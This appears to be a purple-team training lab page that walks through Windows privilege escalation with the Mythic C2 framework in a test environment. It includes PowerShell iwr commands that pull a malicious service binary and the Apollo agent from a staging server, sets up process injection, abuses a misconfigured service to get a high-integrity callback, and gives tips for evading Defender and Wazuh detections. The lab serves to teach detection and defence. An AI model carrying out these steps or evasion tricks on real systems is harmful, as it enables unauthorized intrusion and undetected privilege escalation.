---
layout: default
title: "Red Team Engage - Privilege Escalation"
permalink: /solo-purple-teaming/red-team-engage-privilege-escalation/
---
<link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">

<div class="spt-page">
<a class="spt-back" href="/solo-purple-teaming/">← Back to Solo Purple Teaming</a>
<section class="spt-hero">
<p class="spt-kicker">Solo Purple Teaming</p>
<h1>Red Team Engage - Privilege Escalation</h1>
</section>
<section class="spt-content">
<h2 id="introduction">Introduction</h2>
<p>In this phase, we will:</p>
<ul>
<li>Enumerate vulnerable services.</li>
<li>Attempt privilege escalation.</li>
<li>Trigger (and then work toward bypassing) remaining detections.</li>
<li>End with a challenge for you to bypass the final detection before
moving on to lateral movement.</li>
</ul>
<hr />
<h3 id="1-lab-setup--context"><strong>1. Lab Setup &amp;
Context</strong></h3>
<ul>
<li><strong>Starting point:</strong> We already have <strong>initial
access</strong> to the target system.</li>
<li><strong>Goal:</strong> Enumerate services, escalate privileges, and
attempt to bypass detections.</li>
<li><strong>Note:</strong> One detection will intentionally trigger as a
learning challenge.</li>
</ul>
<hr />
<h3 id="2-interact-with-the-compromised-host"><strong>2. Interact with
the Compromised Host</strong></h3>
<ol type="1">
<li><strong>Double-click</strong> to interact with the existing callback
in Mythic.</li>
<li><strong>Rename the tab</strong> for clarity:
<ul>
<li><p>Set the tab description to:</p>
initial access

<p>and note the compromised user as <code>Arlen</code>.</p></li>
</ul></li>
</ol>
<hr />
<h3 id="3-register-the-service-scan-utility"><strong>3. Register the
Service Scan Utility</strong></h3>
<ul>
<li>In the Mythic interface:
<ol type="1">
<li>Use <code>register assembly</code>.</li>
<li>Select <strong><code>service scan demo.exe</code></strong> from your
files.</li>
<li>Submit the task.</li>
</ol></li>
<li><strong>What happens:</strong> The assembly is staged in memory for
later execution (not run yet).</li>
</ul>
<hr />
<h3 id="4-configure-injection-technique"><strong>4. Configure Injection
Technique</strong></h3>
<ol type="1">
<li><p>Run <code>get injection techniques</code>.</p></li>
<li><p>Select:</p>
syscall_x64.ntcreatethreadex
</li>
<li><p>Submit to apply this injection method.</p></li>
</ol>
<hr />
<h3 id="5-set-the-spawn-process"><strong>5. Set the Spawn
Process</strong></h3>
<ul>
<li><p>Change spawn process to:</p>
smartscreen.exe

<p>(located in <code>C:\Windows\System32</code>)</p></li>
</ul>
<hr />
<h3 id="6-execute-the-service-scan-assembly"><strong>6. Execute the
Service Scan Assembly</strong></h3>
<ol type="1">
<li><p>Use <code>execute assembly</code> on:</p>
service scan demo.exe
</li>
<li><p>Switch to the <strong>assume breach</strong> host to watch for
detections.</p></li>
<li><p>Confirm <strong>Windows Defender</strong> is enabled:</p>
<ul>
<li>Go to <strong>Windows Security → Manage Settings</strong>.</li>
<li><strong>Real-time protection</strong> and <strong>Device Guard
protection</strong> should be <strong>on</strong>.</li>
<li><strong>Automatic sample submission</strong> should be
<strong>off</strong> (prevents lab payloads from being uploaded).</li>
</ul></li>
<li><p><strong>Lab tip:</strong> Keep lab hosts offline unless needed
for updates or downloads.</p></li>
</ol>
<hr />
<h3 id="7-review-service-scan-results"><strong>7. Review Service Scan
Results</strong></h3>
<ul>
<li>Defender does not alert.</li>
<li>Service scan output shows:
<ul>
<li><code>ecoin sync</code> is <strong>vulnerable</strong>.</li>
<li>Current user <strong>can start</strong> the service <strong>and
modify</strong> its binary.</li>
</ul></li>
</ul>
<hr />
<h3 id="8-cleanup-before-exploiting"><strong>8. Cleanup Before
Exploiting</strong></h3>
<ol type="1">
<li><p>Open a shell:</p>
cd Desktop
ls

<ul>
<li>You should see the original <code>ecoin sync</code> binaries
(malicious and legitimate) from Level 0.</li>
</ul></li>
<li><p>Delete the old malicious binary:</p>
del ecoin sync.exe

<ul>
<li><strong>Lesson:</strong> Always reset and clean up after each
scenario.</li>
</ul></li>
</ol>
<hr />
<h3 id="9-retrieve-the-malicious-service-binary"><strong>9. Retrieve the
Malicious Service Binary</strong></h3>
<ul>
<li><p>Use PowerShell to download <code>ecoin sync.exe</code> from your
staging server:</p>
<div class="sourceCode" id="cb7"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">iwr</span> http<span class="op">://</span><span class="dv">192.168</span><span class="op">.</span><span class="dv">100.101</span><span class="op">:</span><span class="dv">8000</span><span class="op">/</span>ecoin_sync<span class="op">.</span><span class="fu">exe</span> <span class="op">-</span>outfile ecoin_sync<span class="op">.</span><span class="fu">exe</span></span></code></pre></div>
<ul>
<li>Using <code>iwr</code> bypasses simple static-string detections on
<code>Invoke-WebRequest</code>.</li>
</ul></li>
<li><p>Confirm with:</p>
ls

<p>The file should be present on the Desktop.</p></li>
</ul>
<hr />
<h3 id="10-retrieve-apollo-payload"><strong>10. Retrieve Apollo
Payload</strong></h3>
<ul>
<li><p>The <code>ecoin sync</code> binary will pull and run
<strong>Apollo</strong> from the Downloads folder.</p></li>
<li><p>Download Apollo into <code>Downloads</code>:</p>
<div class="sourceCode" id="cb9"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="fu">iwr</span> http<span class="op">://</span><span class="dv">192.168</span><span class="op">.</span><span class="dv">100.101</span><span class="op">:</span><span class="dv">8000</span><span class="op">/</span>apollo<span class="op">.</span><span class="fu">exe</span> <span class="op">-</span>outfile C<span class="op">:</span>\Users\Arlen\Downloads\apollo<span class="op">.</span><span class="fu">exe</span></span></code></pre></div></li>
<li><p><strong>Hint:</strong> Think about detections for unsigned
executables in <code>Downloads</code>.</p></li>
</ul>
<hr />
<h3 id="11-start-the-service"><strong>11. Start the
Service</strong></h3>
<ul>
<li><p>From shell:</p>
sc start "ecoin sync"
</li>
<li><p>Check Mythic — you should now have a <strong>high-integrity
callback</strong> as <code>SVC ecoin sync</code>.</p></li>
</ul>
<hr />
<h3 id="12-check-detection-dashboard"><strong>12. Check Detection
Dashboard</strong></h3>
<ul>
<li>In the Wazuh Solo Purple Teaming dashboard:
<ul>
<li><strong>One high alert</strong> was a false positive (service
enumeration by NT AUTHORITY, not you).</li>
<li><strong>One medium alert</strong> (correlation detection)
<strong>DID trigger</strong>:
<ul>
<li>Cause: Apollo is unsigned and ran from the <code>Downloads</code>
folder.</li>
</ul></li>
</ul></li>
</ul>
<hr />
<h3 id="13-challenge-for-students"><strong>13. Challenge for
Students</strong></h3>
<p>Before moving to the next lecture:</p>
<ul>
<li>Your task: <strong>Bypass the last detection</strong>.</li>
<li><strong>Hint:</strong> Investigate what calls Apollo from
<code>Downloads</code> and how you could modify this so it no longer
matches the detection rule.</li>
<li>Goal: Escalate privileges <strong>without any detection</strong>
firing.</li>
</ul>
<hr />
<h3 id="14-next-steps"><strong>14. Next Steps</strong></h3>
<ul>
<li>Once you’ve bypassed the last detection, you’re ready for
<strong>lateral movement</strong>.</li>
<li>In the next lecture, we will gain access to the domain
controller.</li>
</ul>
</section>
</div>
